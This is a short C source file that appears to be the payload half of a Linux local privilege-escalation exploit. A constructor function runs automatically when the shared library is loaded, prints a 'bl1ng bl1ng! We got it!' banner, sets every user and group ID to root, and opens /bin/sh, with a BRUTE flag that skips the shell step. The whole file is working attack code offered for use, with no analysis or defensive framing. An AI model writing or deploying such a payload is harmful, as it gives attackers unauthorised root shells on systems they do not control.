#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
 
static void __attribute__ ((constructor)) _init(void);
 
static void _init(void) {
	printf("[+] bl1ng bl1ng! We got it!\n");
#ifndef BRUTE
	setuid(0); seteuid(0); setgid(0); setegid(0);
	static char *a_argv[] = { "sh", NULL };
	static char *a_envp[] = { "PATH=/bin:/usr/bin:/sbin", NULL };
	execv("/bin/sh", a_argv);
#endif
}
